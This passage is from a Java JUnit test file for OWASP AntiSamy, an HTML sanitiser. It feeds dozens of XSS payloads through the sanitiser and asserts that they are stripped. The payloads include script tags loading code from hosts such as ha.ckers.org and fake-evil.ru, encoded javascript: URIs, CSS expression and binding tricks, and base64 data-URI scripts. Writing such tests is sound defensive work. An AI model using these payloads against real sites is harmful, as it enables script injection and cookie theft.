/*
 * Copyright (c) 2007-2011, Arshan Dabirsiaghi, Jason Li All rights reserved. Redistribution and use in source and
 * binary forms, with or without modification, are permitted provided that the following conditions are met: 1
 * Redistributions of source code must retain the above copyright notice, this list of conditions and the following
 * disclaimer. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the
 * following disclaimer in the documentation and/or other materials provided with the distribution. Neither the name of
 * OWASP nor the names of its contributors may be used to endorse or promote products derived from this software without
 * specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
 * FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED
 * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package org.owasp.validator.html.test;

import static org.junit.Assert.*;

import java.io.IOException;
import java.net.URL;
import java.util.Collections;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.codec.binary.Base64;
import org.junit.Assert;
import org.junit.Before;
import org.junit.Test;
import org.owasp.validator.html.*;
import org.owasp.validator.html.model.Attribute;
import org.owasp.validator.html.model.Tag;

/**
 * This class tests AntiSamy functionality and the basic policy file which should be immune to XSS and CSS phishing
 * attacks.
 *
 * @author Arshan Dabirsiaghi
 */

public class AntiSamyTest {

    private static final String[] BASE64_BAD_XML_STRINGS = new String[]{
            // first string is
            // "<a - href=\"http://www.owasp.org\">click here</a>"
            "PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=",
            // the rest are randomly generated 300 byte sequences which generate
            // parser errors, turned into Strings
            "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",};

    private AntiSamy as = new AntiSamy();
    private TestPolicy policy = null;

    @Before
    public void setUp() throws Exception {

        /*
         * Load the policy. You may have to change the path to find the Policy file for your environment.
         */

        // get Policy instance from a URL.
        URL url = getClass().getResource("/antisamy.xml");
        policy = TestPolicy.getInstance(url);
    }

    @Test
    public void SAX() {
        try {
            CleanResults cr = as.scan("<b>test</i></b>test thsidfshidf<script>sdfsdf", policy, AntiSamy.SAX);
            assertTrue(cr != null && cr.getCleanXMLDocumentFragment() == null && cr.getCleanHTML().length() > 0);
        }
        catch (ScanException e) {
            e.printStackTrace();
        }
        catch (PolicyException e) {
            e.printStackTrace();
        }
    }

    /*
     * Test basic XSS cases.
     */

    @Test
    public void scriptAttacks() throws ScanException, PolicyException {

        assertTrue(!as.scan("test<script>alert(document.cookie)</script>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("script"));
        assertTrue(!as.scan("test<script>alert(document.cookie)</script>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("script"));

        assertTrue(!as.scan("<<<><<script src=http://fake-evil.ru/test.js>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<script"));
        assertTrue(!as.scan("<<<><<script src=http://fake-evil.ru/test.js>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<script"));

        assertTrue(!as.scan("<script<script src=http://fake-evil.ru/test.js>>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<script"));
        assertTrue(!as.scan("<script<script src=http://fake-evil.ru/test.js>>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<script"));

        assertTrue(!as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("onload"));
        assertTrue(!as.scan("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("onload"));

        assertTrue(!as.scan("<BODY ONLOAD=alert('XSS')>", policy, AntiSamy.DOM).getCleanHTML().contains("alert"));
        assertTrue(!as.scan("<BODY ONLOAD=alert('XSS')>", policy, AntiSamy.SAX).getCleanHTML().contains("alert"));

        assertTrue(!as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<iframe"));
        assertTrue(!as.scan("<iframe src=http://ha.ckers.org/scriptlet.html <", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<iframe"));

        assertTrue(!as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.DOM)
                .getCleanHTML().contains("src"));
        assertTrue(!as.scan("<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.SAX)
                .getCleanHTML().contains("src"));

        as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>", policy, AntiSamy.DOM);
        as.scan("<a onblur=\"alert(secret)\" href=\"http://www.google.com\">Google</a>", policy, AntiSamy.SAX);

    }

    @Test
    public void imgAttacks() throws ScanException, PolicyException {

        assertTrue(as.scan("<img src=\"http://www.myspace.com/img.gif\"/>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<img"));
        assertTrue(as.scan("<img src=\"http://www.myspace.com/img.gif\"/>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<img"));

        assertTrue(!as.scan("<img src=javascript:alert(document.cookie)>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<img"));
        assertTrue(!as.scan("<img src=javascript:alert(document.cookie)>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<img"));

        assertTrue(!as.scan(
                "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                policy, AntiSamy.DOM).getCleanHTML().contains("<img"));
        assertTrue(!as.scan(
                "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
                policy, AntiSamy.SAX).getCleanHTML().contains("<img"));

        assertTrue(!as.scan(
                "<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>",
                policy, AntiSamy.DOM).getCleanHTML().contains("<img"));
        assertTrue(!as.scan(
                "<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>",
                policy, AntiSamy.SAX).getCleanHTML().contains("<img"));

        assertTrue(!as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("alert"));
        assertTrue(!as.scan("<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("alert"));

        String s = as.scan(
                "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
                policy, AntiSamy.DOM).getCleanHTML();
        assertTrue(s.length() == 0 || s.contains("&amp;"));
        s = as.scan(
                "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
                policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(s.length() == 0 || s.contains("&amp;"));

        as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
                policy, AntiSamy.DOM);
        as.scan("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
                policy, AntiSamy.SAX);

        assertTrue(!as.scan("<IMG SRC=\"javascript:alert('XSS')\"", policy, AntiSamy.DOM).getCleanHTML()
                .contains("javascript"));
        assertTrue(!as.scan("<IMG SRC=\"javascript:alert('XSS')\"", policy, AntiSamy.SAX).getCleanHTML()
                .contains("javascript"));

        assertTrue(!as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("javascript"));
        assertTrue(!as.scan("<IMG LOWSRC=\"javascript:alert('XSS')\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("javascript"));

        assertTrue(!as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("javascript"));
        assertTrue(!as.scan("<BGSOUND SRC=\"javascript:alert('XSS');\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("javascript"));
    }

    @Test
    public void hrefAttacks() throws ScanException, PolicyException {

        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy, AntiSamy.DOM)
                .getCleanHTML().contains("href"));
        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">", policy, AntiSamy.SAX)
                .getCleanHTML().contains("href"));

        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy, AntiSamy.DOM)
                .getCleanHTML().contains("href"));
        assertTrue(!as.scan("<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">", policy, AntiSamy.SAX)
                .getCleanHTML().contains("href"));

        assertTrue(!as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("ha.ckers.org"));
        assertTrue(!as.scan("<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("ha.ckers.org"));

        assertTrue(!as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy,
                AntiSamy.DOM).getCleanHTML().contains("ha.ckers.org"));
        assertTrue(!as.scan("<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>", policy,
                AntiSamy.SAX).getCleanHTML().contains("ha.ckers.org"));

        assertTrue(!as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
                policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS",
                policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("vbscript"));
        assertTrue(!as.scan("<IMG SRC='vbscript:msgbox(\"XSS\")'>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("vbscript"));

        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
                policy, AntiSamy.DOM).getCleanHTML().contains("<meta"));
        assertTrue(!as.scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
                policy, AntiSamy.SAX).getCleanHTML().contains("<meta"));

        assertTrue(!as
                .scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy, AntiSamy.DOM)
                .getCleanHTML().contains("<meta"));
        assertTrue(!as
                .scan("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<meta"));

        assertTrue(!as.scan(
                "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
                policy, AntiSamy.DOM).getCleanHTML().contains("<meta"));
        assertTrue(!as.scan(
                "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
                policy, AntiSamy.SAX).getCleanHTML().contains("<meta"));

        assertTrue(!as.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy, AntiSamy.DOM).getCleanHTML()
                .contains("iframe"));
        assertTrue(!as.scan("<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>", policy, AntiSamy.SAX).getCleanHTML()
                .contains("iframe"));

        assertTrue(!as.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("background"));
        assertTrue(!as.scan("<TABLE BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("background"));

        assertTrue(!as.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("background"));
        assertTrue(!as.scan("<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("background"));

        assertTrue(!as.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy, AntiSamy.DOM)
                .getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">", policy, AntiSamy.SAX)
                .getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("alert"));
        assertTrue(!as.scan("<DIV STYLE=\"width: expression(alert('XSS'));\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("alert"));

        assertTrue(!as.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("alert"));
        assertTrue(!as.scan("<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("alert"));

        assertTrue(!as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("ript:alert"));
        assertTrue(!as.scan("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("ript:alert"));

        assertTrue(!as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("javascript"));
        assertTrue(!as.scan("<BASE HREF=\"javascript:alert('XSS');//\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("javascript"));

        assertTrue(!as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy, AntiSamy.DOM).getCleanHTML()
                .contains("<base"));
        assertTrue(!as.scan("<BaSe hReF=\"http://arbitrary.com/\">", policy, AntiSamy.SAX).getCleanHTML()
                .contains("<base"));

        assertTrue(!as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>",
                policy, AntiSamy.DOM).getCleanHTML().contains("<object"));
        assertTrue(!as.scan("<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>",
                policy, AntiSamy.SAX).getCleanHTML().contains("<object"));

        assertTrue(!as.scan(
                "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
                policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));

        CleanResults cr = as.scan(
                "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>",
                policy, AntiSamy.SAX);
        // System.out.println(cr.getErrorMessages().get(0));
        assertTrue(!cr.getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy,
                AntiSamy.DOM).getCleanHTML().contains("<embed"));
        assertTrue(!as.scan("<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>", policy,
                AntiSamy.SAX).getCleanHTML().contains("<embed"));

        assertTrue(!as.scan(
                "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
                policy, AntiSamy.DOM).getCleanHTML().contains("<embed"));
        assertTrue(!as.scan(
                "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
                policy, AntiSamy.SAX).getCleanHTML().contains("<embed"));

        assertTrue(!as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM)
                .getCleanHTML().contains("<script"));
